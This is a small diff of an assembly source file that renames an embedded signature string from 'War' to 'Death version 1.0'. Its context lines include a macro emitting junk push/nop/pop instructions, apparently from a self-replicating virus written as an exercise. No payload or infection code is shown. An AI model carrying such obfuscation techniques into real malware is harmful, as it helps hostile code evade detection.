@@ -88,7 +88,7 @@
     db PUSH_RAX, PUSH_RSI, NOP_0, NOP_1, NOP_2, NOP_0, NOP_1, NOP_2, POP_RSI, POP_RAX
 %endmacro
 
-%define SIGNATURE "War version 1.0 (c)oded by dbaffier - AAAABBBB"
+%define SIGNATURE "Death version 1.0 (c)oded by dbaffier - AAAABBBB"
 %strlen SIG_LEN SIGNATURE
 
 %define VAR_LEN F1_LEN + F2_LEN + TMP_LEN + SIG_LEN + 3
